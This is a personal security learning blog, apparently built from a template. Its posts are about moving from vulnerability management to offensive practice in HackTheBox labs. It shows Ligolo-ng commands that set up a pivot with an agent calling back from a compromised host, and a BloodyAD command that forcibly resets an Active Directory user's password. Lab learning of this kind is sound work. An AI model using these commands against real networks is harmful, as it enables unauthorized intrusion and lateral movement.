Vulnerability management and security engineering — living in scanners, CVEs, and remediation. Learning what actually breaks before learning to break it.

The log

Write-ups, notes, and lessons from the lab. Filter by what you're here for.

Vulnerability management is a strange job. You spend all day looking at the ways things break, but you never actually get to break them. After a while, staring at a CVSS score stops answering the only question I really cared about: could I actually pull this off?

The crossover wasn't a clean break. I still think like a defender — that's the advantage. I know what a remediation ticket looks like on the other end, which means I know what findings actually get fixed versus what gets risk-accepted and forgotten. That perspective is the thing I'm bringing with me into offense.

note-to-selfThe goal was never "become a hacker." It was to close the loop — to understand the full lifecycle of a weakness from discovery to exploitation to fix.

This log is where I'll keep myself honest about the journey. Replace this post with your own origin story.

Pivoting was the concept that took me the longest to internalize. On paper it's simple — route traffic through a compromised host into a network you can't reach directly. In practice, juggling proxychains and half a dozen port forwards made every lab feel like knot-tying.

Ligolo-ng reframes it as a TUN interface. Instead of proxying app-by-app, you get a virtual network adapter and route the target subnet through it. Your tools don't know they're being tunneled — they just work.

The setup, minus the pain

# on your attack host — create the interface once
$ sudo ip tuntap add user $USER mode tun ligolo
$ sudo ip link set ligolo up
$ ./proxy -selfcert

# on the pivot host — call back to you
$ ./agent -connect YOUR_IP:11601 -ignore-cert

# in the proxy session — route the internal subnet
ligolo-ng » session
ligolo-ng » ifconfig
# then add the route on your host and everything routes through the agent

lesson-learnedThe moment double-pivots stopped scaring me was the moment I realized Ligolo just stacks: agent behind agent, each one another route. No mental gymnastics.

Swap this out for your own tool deep-dives as you go.

BloodHound shows you the map. It won't drive the car. Early on I'd find a beautiful shortest path to Domain Admin, screenshot it, and then stall — because I didn't know how to walk the edge in front of me.

The turning point was treating each edge type as a small, learnable recipe. ForceChangePassword, GenericAll, AllowedToDelegate — each maps to a concrete BloodyAD command.

Walking a ForceChangePassword edge

# you control an object that can reset a target's password
$ bloodyAD --host DC01.corp.local -d corp.local \
      -u operator -p 'Passw0rd!' \
      set password TARGET_USER 'NewPass123!'
[+] Password changed successfully

# then authenticate as the target and continue the chain
$ nxc smb DC01 -u TARGET_USER -p 'NewPass123!'

The habit that stuck: for every edge in a path, write the one command that walks it in my own notes before touching the box. By the time I'm on target, the chain is already scripted in my head.

I'd gotten comfortable inside a single forest. DCSync here, Kerberoast there, Golden Ticket to lock in access. Then a pro lab threw a forest trust at me and I spent an embarrassing number of hours confused about why my tickets weren't working across the boundary.

The unlock was accepting that a trust is a directional relationship, not a door that swings both ways. Once I mapped which direction the trust flowed and what SID history could carry across it, the cross-forest chain stopped being magic and started being mechanical.

stuck-then-unstuckGetting stuck for hours and then having it click is the actual curriculum. The write-up is easy; the confusion beforehand is where the skill got built.

About

Most of my learning happens in HackTheBox labs and CPTS prep: Active Directory attack chains, pivoting, and the unglamorous discipline of writing findings up clearly. I keep this log to document the crossover honestly — wins, dead ends, and the stuff I wish someone had explained to me sooner.

If you're making the same jump from defense to offense, I hope some of it saves you an evening of confusion.
